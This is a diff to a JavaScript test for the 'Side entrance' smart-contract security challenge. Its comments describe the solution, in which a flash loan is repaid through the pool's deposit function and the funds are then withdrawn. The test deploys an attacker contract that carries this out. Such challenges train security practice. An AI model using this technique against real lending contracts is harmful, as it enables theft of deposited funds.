@@ -25,11 +25,14 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Execution', async function () {
+
         // SideEntranceLenderPool allows us to call deposit function from the flash loan 
         // This keeps its balance constant, but shifts the money to our account inside the pool
         // We can withdraw everything afterwards
+
         attacker =  await (await ethers.getContractFactory('SideEntranceAttacker', player)).deploy(pool.address);
         await attacker.attack();
+        
     });
 
     after(async function () {
